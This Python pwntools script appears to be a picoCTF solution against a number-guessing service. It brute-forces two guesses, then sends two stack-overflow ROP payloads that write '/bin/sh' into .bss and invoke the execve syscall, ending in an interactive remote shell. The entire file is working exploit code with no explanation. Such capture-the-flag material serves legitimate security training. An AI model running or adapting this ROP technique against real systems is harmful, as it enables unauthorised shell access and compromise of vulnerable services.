from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'shape-facility.picoctf.net', 50703

def guess1():
    for i in range(1, 100):
        r = remote(HOST, PORT)
        r.recvuntil('guess?\n')
        r.sendline(str(i))
        res = r.recvline().decode()
        if 'Nope' in res:
            r.close()
            continue
        print(i)
        break

def guess2():
    for i in range(1, 100):
        r = remote(HOST, PORT)
        r.recvuntil('guess?\n')
        r.sendline(str(84))
        r.recvuntil('Name? ')
        r.sendline('A')
        r.recvuntil('guess?\n')
        r.sendline(str(i))
        res = r.recvline().decode()
        if 'Nope' in res:
            r.close()
            continue
        print(i)
        break

r = remote(HOST, PORT)
r.sendline('84')
r.recvuntil('Name? ')

main = 0x400c9c
bss = 0x6bc3a0
pop_rsi_ret = 0x410b93
pop_rdi_ret = 0x4006a6
pop_rdx_ret = 0x410602
pop_rax_ret = 0x4005af
syscall = 0x40138c
mov_qword_ptr_rdi_rdx_ret = 0x4360d3
payload = b''
payload += b'A' * 120
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rdx_ret) + b'/bin/sh\x00'
payload += p64(mov_qword_ptr_rdi_rdx_ret) + p64(main)
r.sendline(payload)

r.recvuntil(b'guess?\n')
r.sendline('87')
r.recvuntil(b'Name? ')

payload = b''
payload += b'A' * 120
payload += p64(pop_rax_ret) + p64(0x3b)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rsi_ret) + p64(0x0)
payload += p64(pop_rdx_ret) + p64(0x0)
payload += p64(syscall)
r.sendline(payload)

r.interactive()